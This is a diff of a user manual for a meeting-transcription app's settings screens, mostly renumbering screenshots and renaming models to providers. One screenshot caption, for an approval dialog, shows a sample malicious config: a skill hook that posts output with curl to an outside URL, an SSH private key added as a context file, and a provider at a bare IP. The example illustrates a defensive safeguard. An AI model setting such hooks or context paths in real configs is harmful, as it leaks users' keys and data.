+![The session kind Meeting, read: the bar with BACK, EDIT, a dimmed MAKE DEFAULT and DELETE; ABOUT with DEFAULT "Yes: suggested first when a session is created or imported", TRANSCRIPTION default · whisper-lan, ASSISTANT default · gemini-flash, TRANSLATION default · gemini-flash; RELATED with MODELS › whisper-lan, gemini-flash.](img/52-settings-kind.png)
 
 Edited, a kind has its name and its own transcription, assistant and
 translation models. Until a chat model is registered, the assistant and
@@ -789,18 +822,18 @@ WITH column of the table reads `No chat model`.
 
 **Prompts** — what instructions the models get:
 
-![Settings, 05 PROMPTS: the bar with VIEW and EDIT; "The instructions the models get with every answer…"; a table NAME · TEXT with RULES FOR EVERY ANSWER (picked) and REVIEWER PROMPT, each with the first line of its text.](img/47-settings-prompts.png)
+![Settings, 07 PROMPTS: the bar with VIEW and EDIT; "The instructions the models get with every answer…"; a table NAME · TEXT with RULES FOR EVERY ANSWER (picked) and REVIEWER PROMPT, each with the first line of its text.](img/53-settings-prompts.png)
 
 RULES FOR EVERY ANSWER are sent with every answer, a skill's or a question's;
 REVIEWER PROMPT is what the reviewer is asked when answers are reviewed. Both
 are always there, so nothing is added or deleted here. Opened, a prompt shows
 its text as it was written; EDIT turns it into a text area, and SAVE saves it:
 
-![RULES FOR EVERY ANSWER, read: the bar with BACK and EDIT; the four rules as written, "- Answer in the language of the transcript." to "- Never attribute to the user facts that are not in the transcript or the context."](img/48-settings-prompt.png)
+![RULES FOR EVERY ANSWER, read: the bar with BACK and EDIT; the four rules as written, "- Answer in the language of the transcript." to "- Never attribute to the user facts that are not in the transcript or the context."](img/54-settings-prompt.png)
 
 **Context** — the files sent with answers:
 
-![Settings, 06 CONTEXT: the bar with ADD CONTEXT SLOT, solid, then VIEW, EDIT and, after a thin rule, DELETE; "Files sent with answers: Global with every answer, a slot only in sessions where it is on."; a table NAME · SENT · FILES: Global (Every session · 1 file, picked), resume (On in INTERVIEW · 1 file).](img/49-settings-context.png)
+![Settings, 08 CONTEXT: the bar with ADD CONTEXT SLOT, solid, then VIEW, EDIT and, after a thin rule, DELETE; "Files sent with answers: Global with every answer, a slot only in sessions where it is on."; a table NAME · SENT · FILES: Global (Every session · 1 file, picked), resume (On in INTERVIEW · 1 file).](img/55-settings-context.png)
 
 Global is the files sent with every answer, in every session; it is always
 there and has nothing to write, so EDIT and DELETE are dimmed on it. Each
@@ -817,16 +850,16 @@ start in, and a new slot gets its files once it is saved.
 
 **Skills** — what the composer's chips do:
 
-![Settings, 07 SKILLS: the bar with ADD SKILL, VIEW, EDIT and DELETE; a table NAME · MODEL · HOOK: reply (default · gemini-flash · HOOK · ON SEND, picked), minutes (claude-haiku), explain (default · gemini-flash).](img/50-settings-skills.png)
+![Settings, 09 SKILLS: the bar with ADD SKILL, VIEW, EDIT and DELETE; a table NAME · MODEL · HOOK: reply (default · gemini-flash · HOOK · ON SEND, picked), minutes (claude-haiku), explain (default · gemini-flash).](img/56-settings-skills.png)
 
 The order here, the order the skills were added in, is the order of the chips
 and of `Alt+1…9`. A skill with no model of its own names the one it inherits:
 
-![The skill reply, read: the bar with BACK, EDIT and DELETE; ABOUT with MODEL default · gemini-flash, HOOK ~/bin/post-to-notes, SEND ON ITS OWN off; PROMPT and OUTPUT FORMAT in full below; RELATED with MODELS › gemini-flash.](img/51-settings-skill.png)
+![The skill reply, read: the bar with BACK, EDIT and DELETE; ABOUT with MODEL default · gemini-flash, HOOK ~/bin/post-to-notes, SEND ON ITS OWN off; PROMPT and OUTPUT FORMAT in full below; RELATED with MODELS › gemini-flash.](img/57-settings-skill.png)
 
 Edited, it has the name, the prompt, the format, the model and its hook:
 
-![The skill reply being edited, EDITING beside SKILL, the bar with a dimmed SAVE and CANCEL: NAME "reply"; PROMPT and OUTPUT FORMAT as text areas; MODEL "default · gemini-flash"; HOOK "~/bin/post-to-notes" and what the command is run with; SEND ON ITS OWN, unlit.](img/52-settings-skill-edit.png)
+![The skill reply being edited, EDITING beside SKILL, the bar with a dimmed SAVE and CANCEL: NAME "reply"; PROMPT and OUTPUT FORMAT as text areas; MODEL "default · gemini-flash"; HOOK "~/bin/post-to-notes" and what the command is run with; SEND ON ITS OWN, unlit.](img/58-settings-skill-edit.png)
 
 A new name warns that global shortcuts call skills by name.
 
@@ -840,7 +873,7 @@ reviewer's switch is dimmed while off, each with the hint `Needs a chat model:
 register one under Settings › Models`. It is not pictured: the pictures run
 with chat models registered.
 
-**Appearance** — the ninth section (Ctrl+9) chooses System, Dark, Light or
+**Appearance** — the eleventh section (`Ctrl+Tab`, or the rail) chooses System, Dark, Light or
 Custom. System follows Omarchy on Linux and the system light/dark app
 preference on Windows. Custom exposes nine color roles, each with a visual
 color dialog and hexadecimal input. Changes save immediately. Switching
@@ -854,7 +887,7 @@ version is the checkout's when it was taken, and the latest release is the
 same: the pictures never ask GitHub (the fixture sets `[update] check = false`),
 so the scene turns CHECK FOR UPDATES on and says the latest in the window only:
 
-![Settings, 08 GENERAL: an empty bar; the note says what the picked row does; a table SETTING · VALUE under five titles: INTERFACE with INTERFACE LANGUAGE, a dropdown "English (US)", picked, HIDE FROM SCREEN SHARING, SHOW ECO IN THE TRAY and SYSTEM NOTIFICATIONS, each a dim OFF chip; REVIEWER with REVIEW ANSWERS, a dim OFF chip with claude-haiku beside it, and SHOW THE DRAFT, a dimmed OFF; AUDIO with DROP ECHOES, a lit ON, and ECHO CANCELLATION, a dim OFF; ANSWERS with MAXIMUM CONTEXT (CHARACTERS) 60000 and ANSWERS AT THE SAME TIME 8; UPDATES with CHECK FOR UPDATES, a lit ON, VERSION, a CHECK NOW button and "0.4.0 · up to date", and DAEMON, a RESTART button and "running".](img/53-settings-general.png)
+![Settings, 10 GENERAL: an empty bar; the note says what the picked row does; a table SETTING · VALUE under five titles: INTERFACE with INTERFACE LANGUAGE, a dropdown "English (US)", picked, HIDE FROM SCREEN SHARING, SHOW ECO IN THE TRAY and SYSTEM NOTIFICATIONS, each a dim OFF chip; REVIEWER with REVIEW ANSWERS, a dim OFF chip with claude-haiku beside it, and SHOW THE DRAFT, a dimmed OFF; AUDIO with DROP ECHOES, a lit ON, and ECHO CANCELLATION, a dim OFF; ANSWERS with MAXIMUM CONTEXT (CHARACTERS) 60000 and ANSWERS AT THE SAME TIME 8; UPDATES with CHECK FOR UPDATES, a lit ON, VERSION, a CHECK NOW button and "0.4.0 · up to date", and DAEMON, a RESTART button and "running".](img/59-settings-general.png)
 
 The note above the table says what the picked row does. There are no screens
 and no commands: each value saves at once.
@@ -941,7 +974,7 @@ field. A value typed wrong shows as it is typed; a missing value once a save is
 tried. Anything that is not one field's shows under the title. Here, ADD MODEL
 and then SAVE with nothing filled:
 
-![A new model being edited, NEW and EDITING beside MODEL, the bar with SAVE and CANCEL: TYPE with CHAT lit; NAME empty, showing "new model", outlined in red with "Give it a name." under it; REASONING, PROVIDER with OPENROUTER lit; MODEL empty, showing "e.g. google/gemini-3.5-flash-lite", outlined in red with "Set the provider's model id." under it; KEY FROM · ENVIRONMENT with "OPENROUTER_API_KEY" and PICK A KEY.](img/54-settings-errors.png)
+![A new model being edited, NEW and EDITING beside MODEL, the bar with SAVE and CANCEL: TYPE with CHAT lit; NAME empty, showing "new model", outlined in red with "Give it a name." under it; REASONING, PROVIDER with openrouter lit and the line on the Providers tab; MODEL empty, showing "e.g. openai/gpt-6-luna", outlined in red with "Set the provider's model id." under it; EXTRA (JSON).](img/60-settings-errors.png)
 
 No model is required: before any is registered, the config saves with no
 default transcription or assistant model, and sessions say none is chosen
@@ -949,20 +982,20 @@ until one is; a default that names a model names a registered one.
 
 **Closing with an item unsaved** asks:
 
-![The UNSAVED CHANGES dialog over the dimmed new model, a dot on the rail's 02 for the item not saved: "Your settings have unsaved changes. Save them before closing?" with SAVE AND CLOSE, KEEP EDITING and, filled red, DISCARD CHANGES.](img/55-settings-unsaved.png)
+![The UNSAVED CHANGES dialog over the dimmed new model, a dot on the rail's 04 for the item not saved: "Your settings have unsaved changes. Save them before closing?" with SAVE AND CLOSE, KEEP EDITING and, filled red, DISCARD CHANGES.](img/61-settings-unsaved.png)
 
 SAVE AND CLOSE saves the item and closes once it is saved; it stays open when
 another item still has changes. Closing the eco window itself closes the
 settings with it and does not ask: unsaved changes there are dropped.
 
 **A change another program asked for.** Only this window's own SAVE writes at
-once a new or changed skill hook, a new context file, or a new model or a
-model's new address or key source. When another program on the socket sends a
+once a new or changed skill hook, a new context file, or a new provider or a
+provider's new address or key source. When another program on the socket sends a
 config that does (an agent, a script), the daemon holds it and every eco window
-asks, naming each hook command, each file path, and each model's address and
+asks, naming each hook command, each file path, and each provider's address and
 where its key comes from (never the key):
 
-![The APPROVE THIS CHANGE dialog over a dimmed live session: "A program other than this window asked to change the settings. Approving saves it: a hook runs as a shell command after answers, a context file is sent to the model, and a model's key is sent to its address."; in red, "hook of minutes: curl -s --data-binary @- https://example.com/collect", "context file: ~/.ssh/id_ed25519" and "model fast: http://203.0.113.7/v1, key from $OPENROUTER_API_KEY"; REJECT and, filled red, APPROVE.](img/56-settings-pending.png)
+![The APPROVE THIS CHANGE dialog over a dimmed live session: "A program other than this window asked to change the settings. Approving saves it: a hook runs as a shell command after answers, a context file is sent to the model, and a provider's key is sent to its address."; in red, "hook of minutes: curl -s --data-binary @- https://example.com/collect", "context file: ~/.ssh/id_ed25519" and "provider fast: http://203.0.113.7/v1, key from $OPENROUTER_API_KEY"; REJECT and, filled red, APPROVE.](img/62-settings-pending.png)
 
 **APPROVE** saves the change; **REJECT** drops it, and a toast says it
 was rejected. Esc and a press outside do not close it. The keyboard starts on
